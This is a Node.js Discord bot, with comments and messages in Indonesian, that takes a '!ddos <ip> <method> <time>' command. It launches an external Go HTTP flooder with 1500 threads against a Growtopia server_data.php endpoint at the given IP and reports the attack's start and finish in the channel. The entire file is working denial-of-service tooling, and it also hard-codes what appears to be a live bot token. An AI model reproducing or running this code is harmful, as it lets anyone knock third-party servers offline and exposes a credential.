const { Client, GatewayIntentBits } = require('discord.js');
const { execFile } = require('child_process');
const fs = require('fs');

const TOKEN = 'MTUwNTYwNTMzODAwNTYzOTI0OA.Gc3jBg.RXqJ0GYuu8b_xY6OH9bFx-XAx_wtfIPM7W1GWg';
const PREFIX = '!';
const BINARY = './http';            // path binary Go flooder
const DEFAULT_THREADS = 1500;       // otomatis 1500 thread

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.on('ready', () => {
    console.log(`Bot ${client.user.tag} aktif!`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;

    const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
    const command = args.shift().toLowerCase();

    if (command !== 'ddos') return;

    // Format: !ddos <ip> <method> <time>
    if (args.length < 3) {
        await message.channel.send(
            'Format: `!ddos <ip> <method> <time>`\n' +
            'Contoh: `!ddos 51.15.23.12 GET 60`\n' +
            'Method: GET / POST, Time dalam detik.'
        );
        return;
    }

    const ip = args[0];
    const method = args[1].toUpperCase();
    const time = parseInt(args[2], 10);

    if (!['GET', 'POST'].includes(method)) {
        await message.channel.send('Method harus GET atau POST');
        return;
    }

    if (isNaN(time) || time <= 0) {
        await message.channel.send('Time harus angka (detik) > 0');
        return;
    }

    const targetUrl = `https://${ip}/growtopia/server_data.php`;

    if (!fs.existsSync(BINARY)) {
        await message.channel.send(`Binary \`${BINARY}\` tidak ditemukan di server.`);
        return;
    }

    await message.channel.send(
        `🔥 **Mulai serangan ke** \`${targetUrl}\`\n` +
        `Method: ${method} | Threads: ${DEFAULT_THREADS} (otomatis) | Durasi: ${time}s`
    );

    // Jalankan binary: ./http <url> <method> <threads> <time>
    execFile(
        BINARY,
        [targetUrl, method, String(DEFAULT_THREADS), String(time)],
        (error, stdout, stderr) => {
            if (error) {
                message.channel.send(`❌ Gagal menjalankan flooder: ${error.message}`);
                return;
            }
            message.channel.send(`✅ Serangan ke \`${ip}\` selesai setelah ${time} detik.`);
        }
    );
});

client.login(TOKEN);